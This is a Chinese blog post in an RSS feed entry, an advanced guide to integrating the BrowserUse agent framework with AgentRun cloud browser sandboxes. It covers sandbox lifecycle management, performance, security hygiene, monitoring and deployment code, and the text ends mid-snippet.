{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "进阶指南：BrowserUse + Agentrun Sandbox 最佳实践指南",
      "link": "https://www.cnblogs.com/Serverless/p/19507367",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Serverless/p/19507367\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 16:12\">\n    <span>进阶指南：BrowserUse + Agentrun Sandbox 最佳实践指南</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p><strong>提示</strong>: 本文是AgentRun Browser Sandbox 快速上手实践指南的姊妹篇,专注于高级集成方案、生产环境的最佳实践、性能优化和部署策略。如果您还没有完成基础学习,请先阅读<a href=\"https://mp.weixin.qq.com/s/2LjN6LxymuZNlWUR-nhrEg\" rel=\"noopener nofollow\" target=\"_blank\">《快速上手：LangChain + AgentRun 浏览器沙箱极简集成指南》</a>。</p>\n</blockquote>\n<h2 id=\"前言\">前言</h2>\n<p>在完成了 Browser Sandbox 的基础集成之后，本文将介绍高级集成方案（如 BrowserUse 框架）以及生产环境部署需要考虑的因素：如何管理 Sandbox 生命周期？如何优化性能和成本？如何保证系统的安全性和可观测性？本文将为您提供全面的高级应用和生产环境最佳实践指南。</p>\n<h2 id=\"基于-browseruse-集成-browser-sandbox\">基于 BrowserUse 集成 Browser Sandbox</h2>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>&lt;效果截图&gt;</p>\n<p>BrowserUse 是一个专门为 AI Agent 设计的浏览器自动化框架,支持视觉理解和智能决策。通过 AgentRun Browser Sandbox，您可以让 BrowserUse 在云端运行,享受 Serverless 架构的优势。</p>\n<h3 id=\"browseruse-架构概览\">BrowserUse 架构概览</h3>\n<p>下图展示了 BrowserUse 与 Browser Sandbox 的集成架构：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>架构特点：</strong></p>\n<ol>\n<li><strong>智能决策循环</strong>：Agent 通过 LLM 分析页面截图,基于视觉理解生成操作指令，执行操作后继续循环，直到任务完成</li>\n<li><strong>无头浏览器控制</strong>：通过 CDP 协议远程控制云端浏览器，Playwright 作为底层驱动，所有操作在云端执行</li>\n<li><strong>实时可视化</strong>：VNC 提供实时画面监控,方便调试和验证 Agent 行为</li>\n</ol>\n<h3 id=\"快速开始\">快速开始</h3>\n<h4 id=\"安装依赖\">安装依赖</h4>\n<pre><code class=\"language-bash\">pip install browser-use python-dotenv agentrun-sdk[playwright,server]\n</code></pre>\n<p>主要依赖说明：</p>\n<ul>\n<li><code>browser-use</code>: BrowserUse 核心库,支持多模态 LLM</li>\n<li><code>agentrun-sdk[playwright,server]</code>: AgentRun SDK，用于创建 Sandbox</li>\n<li><code>python-dotenv</code>: 环境变量管理</li>\n</ul>\n<h4 id=\"配置环境变量\">配置环境变量</h4>\n<p>创建 <code>.env</code> 文件：</p>\n<pre><code class=\"language-bash\"># DashScope API Key（用于 Qwen 模型）\nDASHSCOPE_API_KEY=sk-your-dashscope-api-key\n\n# AgentRun 认证信息\nAGENTRUN_ACCOUNT_ID=your-account-id\nALIBABA_CLOUD_ACCESS_KEY_ID=your-access-key-id\nALIBABA_CLOUD_ACCESS_KEY_SECRET=your-access-key-secret\n\n# Browser Sandbox 模板名称\nBROWSER_TEMPLATE_NAME=sandbox-browser-demo\n</code></pre>\n<h4 id=\"创建-sandbox-并使用-browseruse\">创建 Sandbox 并使用 BrowserUse</h4>\n<pre><code class=\"language-python\">import asyncio\nimport os\nfrom agentrun.sandbox import Sandbox, TemplateType\nfrom browser_use import Agent, BrowserSession, ChatOpenAI\nfrom browser_use.browser import BrowserProfile\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nasync def main():\n    # 创建 Browser Sandbox\n    sandbox = Sandbox.create(\n        template_type=TemplateType.BROWSER,\n        template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n        sandbox_idle_timeout_seconds=3000\n    )\n    \n    # 配置 Qwen 多模态模型\n    llm = ChatOpenAI(\n        model='qwen-vl-max',\n        api_key=os.getenv(\"DASHSCOPE_API_KEY\"),\n        base_url=\"https://dashscope.aliyuncs.com/compatible-mode/v1\"\n    )\n    \n    # 创建浏览器会话\n    browser_session = BrowserSession(\n        cdp_url=sandbox.get_cdp_url(),\n        browser_profile=BrowserProfile(\n            headless=False,\n            timeout=3000000,\n            keep_alive=True\n        )\n    )\n    \n    # 创建 Agent 并执行任务\n    agent = Agent(\n        task=\"访问阿里云官网并总结主要产品分类\",\n        llm=llm,\n        browser_session=browser_session,\n        use_vision=True\n    )\n    \n    result = await agent.run()\n    \n    print(f\"任务结果: {result.final_result()}\")\n    \n    # 清理资源\n    await browser_session.stop()\n    sandbox.delete()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n</code></pre>\n<h3 id=\"browseruse-高级配置\">BrowserUse 高级配置</h3>\n<h4 id=\"自定义浏览器行为\">自定义浏览器行为</h4>\n<pre><code class=\"language-python\">browser_profile = BrowserProfile(\n    timeout=3000000,             # 超时时间（毫秒）\n    keep_alive=True,             # 保持会话活跃\n)\n</code></pre>\n<h4 id=\"多步骤任务编排\">多步骤任务编排</h4>\n<pre><code class=\"language-python\">async def complex_task():\n    \"\"\"复杂的多步骤任务\"\"\"\n    sandbox = Sandbox.create(\n        template_type=TemplateType.BROWSER,\n        template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n        sandbox_idle_timeout_seconds=3000\n    )\n    \n    llm = ChatOpenAI(\n        model='qwen-vl-max',\n        api_key=os.getenv(\"DASHSCOPE_API_KEY\"),\n        base_url=\"https://dashscope.aliyuncs.com/compatible-mode/v1\"\n    )\n    \n    browser_session = BrowserSession(\n        cdp_url=sandbox.cdp_url,\n        browser_profile=BrowserProfile(keep_alive=True)\n    )\n    \n    # 任务 1：信息收集\n    agent1 = Agent(\n        task=\"访问阿里云官网，收集产品分类信息\",\n        llm=llm,\n        browser_session=browser_session,\n        use_vision=True\n    )\n    result1 = await agent1.run()\n    \n    # 任务 2：基于第一步结果继续操作\n    agent2 = Agent(\n        task=f\"基于以下信息：{result1.final_result()}，访问每个产品分类并提取关键特性\",\n        llm=llm,\n        browser_session=browser_session,\n        use_vision=True\n    )\n    result2 = await agent2.run()\n    \n    # 清理资源\n    await browser_session.stop()\n    sandbox.delete()\n    \n    return result2.final_result()\n</code></pre>\n<h4 id=\"集成-vnc-实时监控\">集成 VNC 实时监控</h4>\n<pre><code class=\"language-python\">import webbrowser\nimport urllib.parse\n\nasync def run_with_vnc_monitoring():\n    \"\"\"运行 BrowserUse 并启用 VNC 监控\"\"\"\n    sandbox = Sandbox.create(\n        template_type=TemplateType.BROWSER,\n        template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n        sandbox_idle_timeout_seconds=3000\n    )\n    \n    # 获取 VNC URL 并打开查看器\n    vnc_url = sandbox.get_vnc_url(),\n    if vnc_url:\n        # 修复 VNC URL 路径\n        if vnc_url.endswith('/vnc'):\n            vnc_url = vnc_url[:-4] + '/ws/livestream'\n        \n        # 在浏览器中打开 VNC 查看器\n        encoded_url = urllib.parse.quote(vnc_url, safe='')\n        viewer_url = f\"file://path/to/vnc-viewer.html?url={encoded_url}\"\n        webbrowser.open(viewer_url)\n        print(f\"VNC 查看器已打开，可实时监控浏览器操作\")\n    \n    # 创建并运行 Agent\n    llm = ChatOpenAI(\n        model='qwen-vl-max',\n        api_key=os.getenv(\"DASHSCOPE_API_KEY\"),\n        base_url=\"https://dashscope.aliyuncs.com/compatible-mode/v1\"\n    )\n    \n    browser_session = BrowserSession(\n        cdp_url=sandbox.get_cdp_url(),\n        browser_profile=BrowserProfile(headless=False, keep_alive=True)\n    )\n    \n    agent = Agent(\n        task=\"访问淘宝首页并搜索商品\",\n        llm=llm,\n        browser_session=browser_session,\n        use_vision=True\n    )\n    \n    result = await agent.run()\n    \n    # 清理资源\n    await browser_session.stop()\n    sandbox.delete()\n    \n    return result.final_result()\n</code></pre>\n<h3 id=\"browseruse-最佳实践\">BrowserUse 最佳实践</h3>\n<ol>\n<li><strong>启用视觉理解</strong>：对于复杂页面，使用 <code>use_vision=True</code> 让 LLM 分析页面截图</li>\n<li><strong>保持会话活跃</strong>：使用 <code>keep_alive=True</code> 避免频繁重建连接</li>\n<li><strong>合理设置超时</strong>：根据任务复杂度调整 <code>timeout</code> 参数</li>\n<li><strong>复用 BrowserSession</strong>：对于多步骤任务，复用同一个 BrowserSession 提高效率</li>\n<li><strong>结合 VNC 调试</strong>：开发阶段启用 VNC 实时查看 Agent 行为</li>\n</ol>\n<h3 id=\"获取完整示例代码\">获取完整示例代码</h3>\n<p>本文中的所有示例代码都可以在以下仓库中找到：</p>\n<pre><code class=\"language-bash\"># 克隆示例代码仓库\ngit clone https://github.com/devsapp/agentrun-sandbox-demos.git\n\n# 进入项目目录\ncd agentrun-browseruse-wth-sandbox-demo\n\n# 安装依赖（注意需要安装 server 扩展）\npip install -r requirements.txt\n</code></pre>\n<h4 id=\"配置环境变量-1\">配置环境变量</h4>\n<pre><code class=\"language-bash\"># 复制环境变量模板\ncp env.example .env\n\n# 编辑 .env 文件，填入您的配置信息\n# 必需配置项：\n# - DASHSCOPE_API_KEY: DashScope API Key（用于 Qwen 模型）\n# - AGENTRUN_ACCOUNT_ID: AgentRun 账号 ID\n# - ALIBABA_CLOUD_ACCESS_KEY_ID: 阿里云访问密钥 ID\n# - ALIBABA_CLOUD_ACCESS_KEY_SECRET: 阿里云访问密钥 Secret\n# - BROWSER_TEMPLATE_NAME: Browser Sandbox 模板名称\n</code></pre>\n<h4 id=\"运行示例两步运行设计\">运行示例（两步运行设计）</h4>\n<p>本项目采用<strong>服务器-客户端</strong>的架构设计，需要分两步运行：</p>\n<p><strong>第一步：启动 VNC 查看器服务</strong></p>\n<pre><code class=\"language-bash\"># 在终端 1 中启动 VNC Web 服务器\npython main.py\n\n# 服务启动后会显示：\n# VNC 查看器服务已启动: http://localhost:8000\n# 访问 http://localhost:8000 可以实时查看浏览器操作\n</code></pre>\n<p><code>main.py</code> 的作用：</p>\n<ul>\n<li>启动本地 Web 服务器，提供 VNC 实时查看界面</li>\n<li>提供 WebSocket 代理，连接 AgentRun Sandbox 的 VNC 服务</li>\n<li>允许您在浏览器中实时监控 Agent 的操作过程</li>\n</ul>\n<p><strong>第二步：运行 BrowserUse 示例</strong></p>\n<pre><code class=\"language-bash\"># 在终端 2 中运行示例代码\npython examples/01_browseruse_basic.py\n\n# 运行高级示例\npython examples/02_browseruse_advanced.py\n</code></pre>\n<p><strong>为什么需要两步运行？</strong></p>\n<ol>\n<li><strong>实时监控</strong>：main.py 提供 VNC 查看器，可以实时看到 Agent 在浏览器中的操作</li>\n<li><strong>调试友好</strong>：通过可视化界面，更容易理解 Agent 的决策过程和行为</li>\n<li><strong>服务解耦</strong>：VNC 服务和业务逻辑分离，可以同时运行多个示例而共用同一个查看器</li>\n</ol>\n<p><strong>运行流程图：</strong></p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>仓库内容包括：</strong></p>\n<ul>\n<li><code>main.py</code>: VNC Web 服务器，用于实时监控</li>\n<li><code>examples/01_browseruse_basic.py</code>: 基础集成示例</li>\n<li><code>examples/02_browseruse_advanced.py</code>: 高级配置示例</li>\n<li><code>examples/sandbox_manager.py</code>: Sandbox 生命周期管理</li>\n<li><code>vncviewer/</code>: VNC 查看器前端和后端代码</li>\n<li>完整的环境配置和最佳实践代码</li>\n</ul>\n<hr />\n<h2 id=\"sandbox-生命周期管理最佳实践\">Sandbox 生命周期管理最佳实践</h2>\n<h3 id=\"三种管理模式\">三种管理模式</h3>\n<p>根据不同的应用场景,我们推荐三种 Sandbox 管理模式：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>方案对比：</strong></p>\n<table>\n<thead>\n<tr>\n<th>管理模式</th>\n<th>优点</th>\n<th>缺点</th>\n<th>适用场景</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>单例模式</strong></td>\n<td>• 资源复用   • 响应快   • 简单易用</td>\n<td>• 状态污染风险   • 不适合并发</td>\n<td>开发调试   多轮对话   个人应用</td>\n</tr>\n<tr>\n<td><strong>请求级别</strong></td>\n<td>• 环境隔离   • 状态独立   • 安全性高</td>\n<td>• 创建开销大   • 成本较高</td>\n<td>一次性任务   高安全需求   无状态服务</td>\n</tr>\n<tr>\n<td><strong>连接池</strong></td>\n<td>• 并发能力强   • 资源利用率高   • 性能稳定</td>\n<td>• 实现复杂   • 需要监控</td>\n<td>生产环境   高并发服务   企业应用</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"单例模式实现\">单例模式实现</h3>\n<p>适合开发调试和多轮对话场景：</p>\n<pre><code class=\"language-python\">class SandboxManager:\n    \"\"\"单例模式 Sandbox 管理器\"\"\"\n    _instance = None\n    _sandbox = None\n    \n    def __new__(cls):\n        if cls._instance is None:\n            cls._instance = super().__new__(cls)\n        return cls._instance\n    \n    def get_or_create(self):\n        \"\"\"获取或创建 Sandbox\"\"\"\n        if self._sandbox is None:\n            self._sandbox = Sandbox.create(\n                template_type=TemplateType.BROWSER,\n                template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n                sandbox_idle_timeout_seconds=3000\n            )\n        return self._sandbox\n    \n    def destroy(self):\n        \"\"\"销毁 Sandbox\"\"\"\n        if self._sandbox:\n            self._sandbox.delete()\n            self._sandbox = None\n\n# 使用\nmanager = SandboxManager()\nsandbox = manager.get_or_create()  # 首次创建\nsandbox = manager.get_or_create()  # 复用现有实例\n</code></pre>\n<h3 id=\"连接池模式实现\">连接池模式实现</h3>\n<p>适合高并发生产环境：</p>\n<pre><code class=\"language-python\">from queue import Queue\nfrom threading import Lock\n\nclass SandboxPool:\n    \"\"\"Sandbox 连接池\"\"\"\n    \n    def __init__(self, pool_size=5, max_idle_time=300):\n        self.pool_size = pool_size\n        self.max_idle_time = max_idle_time\n        self.pool = Queue(maxsize=pool_size)\n        self.lock = Lock()\n        self._initialize_pool()\n    \n    def _initialize_pool(self):\n        \"\"\"初始化连接池\"\"\"\n        for _ in range(self.pool_size):\n            sandbox = self._create_sandbox()\n            self.pool.put(sandbox)\n    \n    def _create_sandbox(self):\n        \"\"\"创建 Sandbox 实例\"\"\"\n        return Sandbox.create(\n            template_type=TemplateType.BROWSER,\n            template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n            sandbox_idle_timeout_seconds=self.max_idle_time\n        )\n    \n    def acquire(self, timeout=30):\n        \"\"\"获取 Sandbox 实例\"\"\"\n        try:\n            sandbox = self.pool.get(timeout=timeout)\n            if not self._is_alive(sandbox):\n                sandbox = self._create_sandbox()\n            return sandbox\n        except:\n            raise RuntimeError(\"获取 Sandbox 超时\")\n    \n    def release(self, sandbox):\n        \"\"\"归还 Sandbox 实例\"\"\"\n        if self._is_alive(sandbox):\n            self.pool.put(sandbox)\n        else:\n            new_sandbox = self._create_sandbox()\n            self.pool.put(new_sandbox)\n    \n    def _is_alive(self, sandbox):\n        \"\"\"检查 Sandbox 是否存活\"\"\"\n        try:\n            return hasattr(sandbox, 'sandbox_id')\n        except:\n            return False\n\n# 使用\npool = SandboxPool(pool_size=5)\n\nsandbox = pool.acquire()\ntry:\n    # 使用 sandbox 执行任务\n    pass\nfinally:\n    pool.release(sandbox)\n</code></pre>\n<h3 id=\"会话状态管理\">会话状态管理</h3>\n<p>支持多用户多会话场景：</p>\n<pre><code class=\"language-python\">import time\n\nclass SessionManager:\n    \"\"\"会话状态管理\"\"\"\n    \n    def __init__(self):\n        self.sessions = {}  # session_id -&gt; sandbox\n    \n    def create_session(self, session_id: str):\n        \"\"\"创建会话\"\"\"\n        if session_id not in self.sessions:\n            sandbox = Sandbox.create(\n                template_type=TemplateType.BROWSER,\n                template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n                sandbox_idle_timeout_seconds=1800\n            )\n            self.sessions[session_id] = {\n                'sandbox': sandbox,\n                'created_at': time.time(),\n                'last_used': time.time()\n            }\n        return self.sessions[session_id]['sandbox']\n    \n    def get_session(self, session_id: str):\n        \"\"\"获取会话\"\"\"\n        if session_id in self.sessions:\n            session = self.sessions[session_id]\n            session['last_used'] = time.time()\n            return session['sandbox']\n        return None\n    \n    def cleanup_expired_sessions(self, max_idle_time=1800):\n        \"\"\"清理过期会话\"\"\"\n        current_time = time.time()\n        expired_sessions = []\n        \n        for session_id, session in self.sessions.items():\n            if current_time - session['last_used'] &gt; max_idle_time:\n                expired_sessions.append(session_id)\n        \n        for session_id in expired_sessions:\n            self.destroy_session(session_id)\n    \n    def destroy_session(self, session_id: str):\n        \"\"\"销毁会话\"\"\"\n        if session_id in self.sessions:\n            self.sessions[session_id]['sandbox'].delete()\n            del self.sessions[session_id]\n</code></pre>\n<h2 id=\"性能优化\">性能优化</h2>\n<h3 id=\"超时时间配置\">超时时间配置</h3>\n<p>合理设置超时时间是平衡性能和成本的关键：</p>\n<pre><code class=\"language-python\"># 开发环境（调试用）\nsandbox = Sandbox.create(\n    template_name=\"dev-template\",\n    sandbox_idle_timeout_seconds=7200  # 2 小时\n)\n\n# 生产环境（单次任务）\nsandbox = Sandbox.create(\n    template_name=\"prod-template\",\n    sandbox_idle_timeout_seconds=300  # 5 分钟\n)\n\n# 长时间任务\nsandbox = Sandbox.create(\n    template_name=\"long-task-template\",\n    sandbox_idle_timeout_seconds=10800  # 3 小时\n)\n</code></pre>\n<p><strong>超时策略推荐：</strong></p>\n<table>\n<thead>\n<tr>\n<th>场景</th>\n<th>推荐超时</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>开发调试</td>\n<td>1-2 小时</td>\n<td>方便调试,避免频繁重建</td>\n</tr>\n<tr>\n<td>简单任务</td>\n<td>5-10 分钟</td>\n<td>单页操作,快速完成</td>\n</tr>\n<tr>\n<td>复杂任务</td>\n<td>30-60 分钟</td>\n<td>多步骤流程,需要时间</td>\n</tr>\n<tr>\n<td>后台服务</td>\n<td>2-4 小时</td>\n<td>长期运行,定期刷新</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"sandbox-复用策略\">Sandbox 复用策略</h3>\n<pre><code class=\"language-python\">class SmartSandboxManager:\n    \"\"\"智能 Sandbox 复用管理器\"\"\"\n    \n    def __init__(self):\n        self.sandboxes = {}  # key -&gt; sandbox\n        self.usage_count = {}  # key -&gt; count\n    \n    def get_sandbox(self, user_id: str, session_id: str):\n        \"\"\"获取或创建 Sandbox（支持复用）\"\"\"\n        key = f\"{user_id}:{session_id}\"\n        \n        if key not in self.sandboxes:\n            self.sandboxes[key] = Sandbox.create(\n                template_type=TemplateType.BROWSER,\n                template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n                sandbox_idle_timeout_seconds=1800\n            )\n            self.usage_count[key] = 0\n        \n        self.usage_count[key] += 1\n        return self.sandboxes[key]\n    \n    def should_recreate(self, key: str, max_reuse=50):\n        \"\"\"判断是否需要重建（防止状态累积）\"\"\"\n        return self.usage_count.get(key, 0) &gt;= max_reuse\n    \n    def recreate_if_needed(self, key: str):\n        \"\"\"按需重建 Sandbox\"\"\"\n        if self.should_recreate(key):\n            if key in self.sandboxes:\n                self.sandboxes[key].delete()\n                del self.sandboxes[key]\n                self.usage_count[key] = 0\n</code></pre>\n<h3 id=\"错误处理和重试机制\">错误处理和重试机制</h3>\n<p>使用 tenacity 库实现智能重试：</p>\n<pre><code class=\"language-python\">from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type\n\nclass SandboxError(Exception):\n    \"\"\"Sandbox 操作异常\"\"\"\n    pass\n\n@retry(\n    retry=retry_if_exception_type(SandboxError),\n    stop=stop_after_attempt(3),\n    wait=wait_exponential(multiplier=1, min=2, max=10)\n)\ndef execute_with_retry(sandbox, operation):\n    \"\"\"带重试的操作执行\"\"\"\n    try:\n        return operation(sandbox)\n    except ConnectionError:\n        raise SandboxError(\"连接失败\")\n    except TimeoutError:\n        raise SandboxError(\"操作超时\")\n    except Exception as e:\n        print(f\"操作失败: {e}\")\n        raise SandboxError(f\"操作失败: {e}\")\n\n# 使用示例\ndef navigate_page(sandbox):\n    with sync_playwright() as p:\n        browser = p.chromium.connect_over_cdp(sandbox.cdp_url)\n        page = browser.contexts[0].pages[0]\n        page.goto(\"https://example.com\", timeout=30000)\n        return page.title()\n\nresult = execute_with_retry(sandbox, navigate_page)\n</code></pre>\n<h2 id=\"安全性最佳实践\">安全性最佳实践</h2>\n<h3 id=\"环境变量保护\">环境变量保护</h3>\n<pre><code class=\"language-python\">import os\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\n# 验证必需的环境变量\nrequired_vars = [\"DASHSCOPE_API_KEY\", \"AGENTRUN_ACCOUNT_ID\"]\nmissing_vars = [var for var in required_vars if not os.getenv(var)]\nif missing_vars:\n    raise ValueError(f\"缺少必需的环境变量: {', '.join(missing_vars)}\")\n\n# 敏感信息不要硬编码\nAPI_KEY = os.getenv(\"DASHSCOPE_API_KEY\")\nACCESS_KEY_ID = os.getenv(\"ALIBABA_CLOUD_ACCESS_KEY_ID\")\nACCESS_KEY_SECRET = os.getenv(\"ALIBABA_CLOUD_ACCESS_KEY_SECRET\")\n</code></pre>\n<h3 id=\"url-白名单\">URL 白名单</h3>\n<pre><code class=\"language-python\">ALLOWED_DOMAINS = [\n    'example.com',\n    'aliyun.com',\n    'alibaba.com'\n]\n\ndef is_url_allowed(url: str) -&gt; bool:\n    \"\"\"检查 URL 是否在白名单中\"\"\"\n    from urllib.parse import urlparse\n    domain = urlparse(url).netloc\n    return any(allowed in domain for allowed in ALLOWED_DOMAINS)\n\ndef safe_navigate(page, url: str):\n    \"\"\"安全导航\"\"\"\n    if not is_url_allowed(url):\n        raise ValueError(f\"URL 不在白名单中: {url}\")\n    page.goto(url)\n</code></pre>\n<h3 id=\"日志脱敏\">日志脱敏</h3>\n<pre><code class=\"language-python\">import re\n\ndef sanitize_log(log_text: str) -&gt; str:\n    \"\"\"日志脱敏\"\"\"\n    # 脱敏 API Key\n    log_text = re.sub(r'sk-[a-zA-Z0-9]{20,}', 'sk-***', log_text)\n    # 脱敏 Access Key\n    log_text = re.sub(r'LTAI[a-zA-Z0-9]{12,}', 'LTAI***', log_text)\n    # 脱敏密码\n    log_text = re.sub(r'password[\"\\s:=]+[^\"\\s,}]+', 'password: ***', log_text, flags=re.IGNORECASE)\n    return log_text\n\n# 使用\nprint(sanitize_log(f\"使用 API Key: {API_KEY}\"))\n</code></pre>\n<h2 id=\"可观测性与监控\">可观测性与监控</h2>\n<h3 id=\"日志记录最佳实践\">日志记录最佳实践</h3>\n<pre><code class=\"language-python\">import logging\nfrom datetime import datetime\n\n# 配置日志\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\n    handlers=[\n        logging.FileHandler(f'sandbox_{datetime.now().strftime(\"%Y%m%d\")}.log'),\n        logging.StreamHandler()\n    ]\n)\n\nlogger = logging.getLogger(__name__)\n\nclass MonitoredSandboxManager:\n    \"\"\"带监控的 Sandbox 管理器\"\"\"\n    \n    def create_sandbox(self, **kwargs):\n        \"\"\"创建 Sandbox（带日志）\"\"\"\n        start_time = time.time()\n        logger.info(f\"开始创建 Sandbox: {kwargs}\")\n        \n        try:\n            sandbox = Sandbox.create(**kwargs)\n            duration = time.time() - start_time\n            logger.info(f\"Sandbox 创建成功: {sandbox.sandbox_id}, 耗时: {duration:.2f}s\")\n            return sandbox\n        except Exception as e:\n            duration = time.time() - start_time\n            logger.error(f\"Sandbox 创建失败: {e}, 耗时: {duration:.2f}s\")\n            raise\n    \n    def execute_task(self, sandbox, task_name: str, operation):\n        \"\"\"执行任务（带日志）\"\"\"\n        start_time = time.time()\n        logger.info(f\"开始执行任务: {task_name}, Sandbox: {sandbox.sandbox_id}\")\n        \n        try:\n            result = operation(sandbox)\n            duration = time.time() - start_time\n            logger.info(f\"任务执行成功: {task_name}, 耗时: {duration:.2f}s\")\n            return result\n        except Exception as e:\n            duration = time.time() - start_time\n            logger.error(f\"任务执行失败: {task_name}, 错误: {e}, 耗时: {duration:.2f}s\")\n            raise\n</code></pre>\n<h3 id=\"指标收集\">指标收集</h3>\n<pre><code class=\"language-python\">from dataclasses import dataclass\nfrom typing import Dict, List\nimport json\n\n@dataclass\nclass SandboxMetrics:\n    \"\"\"Sandbox 指标\"\"\"\n    sandbox_id: str\n    create_time: float\n    destroy_time: float = None\n    total_requests: int = 0\n    failed_requests: int = 0\n    total_duration: float = 0.0\n\nclass MetricsCollector:\n    \"\"\"指标收集器\"\"\"\n    \n    def __init__(self):\n        self.metrics: Dict[str, SandboxMetrics] = {}\n    \n    def record_creation(self, sandbox_id: str):\n        \"\"\"记录创建\"\"\"\n        self.metrics[sandbox_id] = SandboxMetrics(\n            sandbox_id=sandbox_id,\n            create_time=time.time()\n        )\n    \n    def record_request(self, sandbox_id: str, duration: float, success: bool):\n        \"\"\"记录请求\"\"\"\n        if sandbox_id in self.metrics:\n            metric = self.metrics[sandbox_id]\n            metric.total_requests += 1\n            metric.total_duration += duration\n            if not success:\n                metric.failed_requests += 1\n    \n    def record_destruction(self, sandbox_id: str):\n        \"\"\"记录销毁\"\"\"\n        if sandbox_id in self.metrics:\n            self.metrics[sandbox_id].destroy_time = time.time()\n    \n    def export_metrics(self, filepath: str):\n        \"\"\"导出指标\"\"\"\n        metrics_data = [\n            {\n                'sandbox_id': m.sandbox_id,\n                'create_time': m.create_time,\n                'destroy_time': m.destroy_time,\n                'total_requests': m.total_requests,\n                'failed_requests': m.failed_requests,\n                'success_rate': (m.total_requests - m.failed_requests) / m.total_requests if m.total_requests &gt; 0 else 0,\n                'avg_duration': m.total_duration / m.total_requests if m.total_requests &gt; 0 else 0,\n                'lifetime': m.destroy_time - m.create_time if m.destroy_time else time.time() - m.create_time\n            }\n            for m in self.metrics.values()\n        ]\n        \n        with open(filepath, 'w') as f:\n            json.dump(metrics_data, f, indent=2)\n\n# 使用\ncollector = MetricsCollector()\ncollector.record_creation(sandbox.sandbox_id)\n# ... 执行任务 ...\ncollector.export_metrics('metrics.json')\n</code></pre>\n<h2 id=\"成本优化\">成本优化</h2>\n<h3 id=\"按需创建与销毁\">按需创建与销毁</h3>\n<pre><code class=\"language-python\">class CostOptimizedManager:\n    \"\"\"成本优化的管理器\"\"\"\n    \n    def __init__(self, idle_threshold=300):\n        self.idle_threshold = idle_threshold\n        self.sandboxes = {}\n        self.last_used = {}\n    \n    def get_sandbox(self, key: str):\n        \"\"\"获取 Sandbox（懒加载）\"\"\"\n        if key not in self.sandboxes:\n            self.sandboxes[key] = Sandbox.create(\n                template_type=TemplateType.BROWSER,\n                template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n                sandbox_idle_timeout_seconds=self.idle_threshold\n            )\n        \n        self.last_used[key] = time.time()\n        return self.sandboxes[key]\n    \n    def cleanup_idle(self):\n        \"\"\"清理闲置 Sandbox\"\"\"\n        current_time = time.time()\n        to_remove = []\n        \n        for key, last_time in self.last_used.items():\n            if current_time - last_time &gt; self.idle_threshold:\n                to_remove.append(key)\n        \n        for key in to_remove:\n            if key in self.sandboxes:\n                self.sandboxes[key].delete()\n                del self.sandboxes[key]\n                del self.last_used[key]\n                logger.info(f\"清理闲置 Sandbox: {key}\")\n</code></pre>\n<h3 id=\"批量任务处理\">批量任务处理</h3>\n<pre><code class=\"language-python\">async def batch_process_tasks(tasks: List[str], pool_size: int = 5):\n    \"\"\"批量处理任务（复用 Sandbox）\"\"\"\n    pool = SandboxPool(pool_size=pool_size)\n    results = []\n    \n    for task in tasks:\n        sandbox = pool.acquire()\n        try:\n            # 处理任务\n            result = await process_task(sandbox, task)\n            results.append(result)\n        finally:\n            pool.release(sandbox)\n    \n    return results\n</code></pre>\n<h2 id=\"生产环境部署\">生产环境部署</h2>\n<h3 id=\"环境配置\">环境配置</h3>\n<p><strong>开发环境 (.env.dev)</strong>：</p>\n<pre><code class=\"language-bash\"># 开发环境配置\nBROWSER_TEMPLATE_NAME=dev-browser-template\nSANDBOX_IDLE_TIMEOUT=7200\nPOOL_SIZE=2\nLOG_LEVEL=DEBUG\n</code></pre>\n<p><strong>生产环境 (.env.prod)</strong>：</p>\n<pre><code class=\"language-bash\"># 生产环境配置\nBROWSER_TEMPLATE_NAME=prod-browser-template\nSANDBOX_IDLE_TIMEOUT=300\nPOOL_SIZE=10\nLOG_LEVEL=INFO\nENABLE_METRICS=true\nMETRICS_EXPORT_INTERVAL=300\n</code></pre>\n<h3 id=\"高可用架构\">高可用架构</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"健康检查\">健康检查</h3>\n<pre><code class=\"language-python\">from flask import Flask, jsonify\n\napp = Flask(__name__)\nmanager = SandboxManager()\n\n@app.route('/health')\ndef health_check():\n    \"\"\"健康检查端点\"\"\"\n    try:\n        # 检查 Sandbox 是否可用\n        sandbox = manager.get_or_create()\n        \n        # 简单的健康检查\n        is_healthy = hasattr(sandbox, 'sandbox_id')\n        \n        if is_healthy:\n            return jsonify({\n                'status': 'healthy',\n                'sandbox_id': sandbox.sandbox_id,\n                'timestamp': time.time()\n            }), 200\n        else:\n            return jsonify({\n                'status': 'unhealthy',\n                'error': 'Sandbox not available'\n            }), 503\n    except Exception as e:\n        return jsonify({\n            'status': 'unhealthy',\n            'error': str(e)\n        }), 503\n\n@app.route('/metrics')\ndef metrics():\n    